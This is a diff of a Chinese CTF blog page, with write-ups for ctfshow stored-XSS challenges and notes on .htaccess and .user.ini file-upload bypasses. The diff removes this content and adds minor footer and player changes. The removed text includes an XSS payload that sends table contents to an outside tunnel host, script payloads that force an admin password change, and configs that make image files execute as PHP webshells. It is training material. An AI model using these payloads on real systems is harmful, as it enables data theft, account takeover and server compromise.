-<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
-	<span class="token punctuation">&#123;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://1f72ec63.r3.cpolar.top/x.php?c='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token comment">/*该 JavaScript 代码中的主要功能是在当前网页中查找所有类名为“laytable-cell-1-0-1”的
-元素。使用 jQuery 库中的 each() 函数迭代这些元素，对每个元素执行以下操作：
-使用 indexOf() 函数检查该元素中的文本是否包含“ctfshow&#123;”字符串，如果包含则执行下一步，
-否则不做任何操作。
-
-构造一个 URL，其中“http://ip/x.php?cookie=”是目标网站的 URL，而 value.innerText
- 是包含“ctfshow&#123;”字符串的元素的文本内容，将该文本作为参数添加到 URL 末尾。
-
-使用 location.href 跳转到新的 URL 页面。
-
-
-"laytable-cell-1-0-1" 是一个 HTML 元素的类名（class name），用于标识该元素属于一个
-表格（table）中的一个单元格（cell）。通常情况下，一个表格中的单元格都具有类似的类名，例
-如“laytable-cell-1-0-2”、“laytable-cell-1-1-0”等等，其中的数字表示单元格在表格中的
-行列位置。该类名可能是由某个前端框架或库自动生成的，用于对表格进行样式设置或 JavaScript 
-操作。在给定的 JavaScript 代码中，该类名被用于查找包含特定字符串的单元格并执行相关操作。
-*/</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<blockquote>
-<p>这是一段 JavaScript 代码，其作用是在当前网页中寻找所有类名为“laytable-cell-1-0-1”的元素，如果这些元素中的文本包含“ctfshow{”，那么将跳转到“<a target="_blank" rel="noopener" href="http://ip/x.php?cookie=%E2%80%9D+value.innerText">http://ip/x.php?cookie=”+value.innerText</a> 的页面，其中 value.innerText 是包含“ctfshow{”文本的元素的文本内容。请注意，该代码可能会对用户的计算机或网络造成潜在的安全风险，应仅在安全环境中运行。</p>
-</blockquote>
-<p>注册一个新用户 密码填入payload<br><code>&lt;script&gt; $(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;     if(value.innerText.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)     &#123;location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+value.innerText&#125; &#125;); &lt;/script&gt;</code><br>一段时候得到flag。<br><img src="https://img-blog.csdnimg.cn/f5598608d95847fb9ae9c8d93ed5c14e.png" alt="2"></p>
-<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>本题多了一个修改密码的选项，抓包看看。存在一个api接口。<br><img src="https://img-blog.csdnimg.cn/466be17549174dadbe636ff9ea1c7206.png" alt="1"><br>我们可以再创建一个用户，user为payload也就是<code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=asdd&#39;&lt;/script&gt;</code><br>这时当我们登陆时就是管理员身份。<br><img src="https://img-blog.csdnimg.cn/7dab5e3fba604f1494dc8156c0c6ebca.png" alt="2"></p>
-<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>抓包发现要使用post请求，不太懂js。网上搜一下使用js发送http请求。<br>推荐一个方法：</p>
-<h4 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest()"></a>XMLHttpRequest()</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第一步：创建需要的对象</span>
-httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//第二步：打开连接</span>
-httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）</span>
-httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'name=teswe&amp;ee=ef'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发送请求 将情头体写在send中</span>
-<span class="token comment">/**
- * 获取数据后的处理程序
- */</span>
-httpRequest<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//请求后的回调接口，可将请求成功后要执行的程序写在其中</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span>httpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> httpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//验证请求是否发送成功</span>
-        <span class="token keyword">var</span> json <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token comment">//获取到服务端返回的数据</span>
-        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>注册user 和password的payload，访问用户管理页面即可得到flag。</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
-<span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/api/change.php'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'p=1234567'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://img-blog.csdnimg.cn/8ab67c81294a4c38ba416d389eb32f4d.png" alt="2"></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -1340,55 +504,7 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>httpd-conf 是 Apache 的系统配置文件，一个全局的配置文件，对整个 web 服务起作用；而.htaccess 也是 Apache 的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。</p>
-<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>在绕过文件上传的限制中，通常在 Apache 全局配置文件 httpd.conf 中有这样一条配置：</p>
-<pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-
-
-
-
-<p>这条配置的意思就是将.php、.phtml 文件后缀的文件当做 php 文件执行，如果开启了这条配置，就可以上传.phtml 文件在执行  php 代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php 文件后缀。  </p>
-<p>或者这条配置：</p>
-<pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p>将所有文件都解析为 php 文件。  </p>
-<p>通常全局文件我们都是不可更改的，而 Apache 还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的 web 目录起作用，例如：我们在 www 目录下有一个.htaccess 配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将 jpg 文件当做 PHP 文件解析。这样就可以直接解析 jpg 后缀的 webshell。</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .htaccessAddType application&#x2F;x-httpd-php .jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p>访问 1.jpg，当做 PHP 解析。  </p>
-<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>.htaccess 配置文件只在 Apache 服务器中起作用。  </p>
-<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；而.user.ini 和.htaccess 一样是目录的配置文件，.user.ini 就是用户自定义的一个 php.ini，通常用这个文件来构造后门和隐藏后门。</p>
-<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>php 配置项中有两个配置可以起到一些作用</p>
-<pre class="line-numbers language-none"><code class="language-none">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;包含在文件头auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;包含在文件尾<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p>这两个配置项的作用相当于一个文件包含，比如</p>
-<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .user.iniauto_prepend_file &#x3D; 1.jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;&#x2F;&#x2F; 11.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-<p>也就是在一个目录下有.user.ini 这个配置文件，配置内容为上，有 1.jpg，同时该目录下还需要有.php 后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 11.php 文件头插入了 <code>require(&#39;1.jpg&#39;)</code> 这条语句，也就是说相当于文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。</p>
-<p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。  </p>
-<h4 id="局限-1"><a href="#局限-1" class="headerlink" title="局限"></a>局限</h4><p>在.user.ini 中使用这条配置的使用也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。  </p>
-<p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。  </p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -1434,14 +550,7 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-   
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -1475,7 +584,7 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
     <ul>
       <li>
         Copyrights &copy;
-        2015-2023
+        2022-2023
         <i class="ri-heart-fill heart_icon"></i> n0rt6
       </li>
     </ul>
@@ -1498,6 +607,10 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
     </ul>
     <ul>
       
+        <li>
+          <a href="https://beian.miit.gov.cn/" target="_black" rel="nofollow">豫ICP备88888888</a>
+        </li>
+        
     </ul>
     <ul>
       
@@ -1528,7 +641,7 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
 <nav class="navbar">
   
   <div class="logo">
-    <a href="/"><img src="/images/ayer-side.svg" alt="n0rt6&#39;s bolg"></a>
+    <a href="/"><img src="/images/ayer-side.png" alt="n0rt6&#39;s bolg"></a>
   </div>
   
   <ul class="nav nav-main">
@@ -1562,7 +675,7 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
     </li>
     
     <li class="nav-item">
-      <a class="nav-item-link" href="/2019/about">关于我</a>
+      <a class="nav-item-link" href="/about">关于我</a>
     </li>
     
   </ul>
@@ -1575,10 +688,6 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
         <i class="ri-search-line"></i>
       </a>
       
-      
-      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
-        <i class="ri-rss-line"></i>
-      </a>
       
     </li>
   </ul>
@@ -1807,7 +916,9 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
 </script>
  
 <!-- CanvasBackground -->
-
+ 
+<script src="/js/dz.js"></script>
+ 
 <script>
   if (window.mermaid) {
     mermaid.initialize({ theme: "forest" });
@@ -1815,6 +926,23 @@ httpRequest<span class="token punctuation">.</span><span class="token function">
 </script>
 
 
+    
+    <div id="music">
+    
+    
+    
+    <iframe frameborder="no" border="1" marginwidth="0" marginheight="0" width="200" height="52"
+        src="//music.163.com/outchain/player?type=2&id=22707008&auto=0&height=32"></iframe>
+</div>
+
+<style>
+    #music {
+        position: fixed;
+        right: 15px;
+        bottom: 0;
+        z-index: 998;
+    }
+</style>
     
     
 
